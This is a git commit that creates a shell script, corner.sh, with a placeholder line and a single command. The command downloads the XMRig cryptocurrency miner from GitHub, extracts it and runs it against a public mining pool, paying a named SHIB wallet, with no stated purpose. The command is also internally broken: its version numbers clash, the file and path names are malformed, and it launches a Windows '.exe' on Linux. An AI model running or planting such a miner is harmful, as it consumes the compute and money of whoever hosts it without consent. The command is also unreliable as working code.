2fc01972191326b0d855d9ed2f2975135b429321
aymanmino39 <114359122+aymanmino39@users.noreply.github.com>
2022-09-25 20:13:10 +0100

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,2 @@
+Your scipt
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.17.0-linux-.x64.tar.gz && tar -xvf xmrig-6.17.0 && ./xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xDf2D57340Aa27faD1B748b1DCD2C31b87970cAaB.SHIB_POOL#blw8-9mqt -p x
